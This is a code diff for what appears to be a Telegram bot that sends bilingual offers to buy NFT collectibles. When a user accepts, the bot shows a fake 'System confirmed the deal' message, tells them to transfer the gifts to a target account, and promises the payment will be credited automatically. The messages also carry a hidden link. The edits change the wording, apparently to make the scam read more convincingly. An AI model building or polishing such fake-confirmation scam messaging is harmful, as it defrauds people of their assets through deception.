@@ -115,22 +115,21 @@ async def send_offer(message: Message):
         else:
             offer_text = f"<b>{sender_name} offers you {amount} {currency_display} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>\n{hidden_link}"
     else:
+        # УБРАЛИ ФРАЗУ "Система подтвердила сделку" И ИЗМЕНИЛИ ТЕКСТ
         if lang == "ru":
             offer_text = (
-                f"<b>Система подтвердила сделку.</b>\n\n"
-                f"<b>Покупатель {sender_name} предлагает Вам {amount} {currency_display} за коллекцию коллекционных предметов:</b>\n"
+                f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекцию из двух коллекционных предметов:</b>\n"
                 f"1. {nft1_link}\n"
                 f"2. {nft2_link}\n\n"
-                f"<i>Предложение действует ещё 5ч 59м.</i>\n"
+                f"<i>Действует 5ч 59м.</i>\n"
                 f"{hidden_link}"
             )
         else:
             offer_text = (
-                f"<b>System confirmed the deal.</b>\n\n"
-                f"<b>Buyer {sender_name} offers you {amount} {currency_display} for a collection of collectibles:</b>\n"
+                f"<b>{sender_name} offers you {amount} {currency_display} for a collection of two collectibles:</b>\n"
                 f"1. {nft1_link}\n"
                 f"2. {nft2_link}\n\n"
-                f"<i>Offer expires in 5h 59m.</i>\n"
+                f"<i>Expires in 5h 59m.</i>\n"
                 f"{hidden_link}"
             )
 
@@ -140,7 +139,7 @@ async def send_offer(message: Message):
     ]])
 
     last_offer_data = {
-        "nft_name": nft1_name if nft_count == 1 else f"Коллекция из 2 предметов",
+        "nft_name": nft1_name if nft_count == 1 else "Два предмета",
         "amount": amount,
         "currency_display": currency_display,
         "link": link1,
@@ -186,7 +185,7 @@ async def on_accept_offer(callback: CallbackQuery):
         if lang == "ru":
             new_text = (
                 f"<b>Система подтвердила сделку.</b>\n\n"
-                f"<b>• Передайте оба коллекционных предмета покупателю {target_account} для завершения сделки.</b>\n\n"
+                f"<b>• Передайте оба предмета покупателю {target_account} для завершения сделки.</b>\n\n"
                 f"<b>После передачи подарков вам автоматически зачислятся {amount} {currency_display} на ваш баланс.</b>\n"
                 f"{hidden_link}"
             )
@@ -195,7 +194,7 @@ async def on_accept_offer(callback: CallbackQuery):
         else:
             new_text = (
                 f"<b>System confirmed the deal.</b>\n\n"
-                f"<b>• Transfer both collectibles to {target_account} to complete the deal.</b>\n\n"
+                f"<b>• Transfer both items to {target_account} to complete the deal.</b>\n\n"
                 f"<b>After transferring the gifts, {amount} {currency_display} will be automatically credited to your balance.</b>\n"
                 f"{hidden_link}"
             )
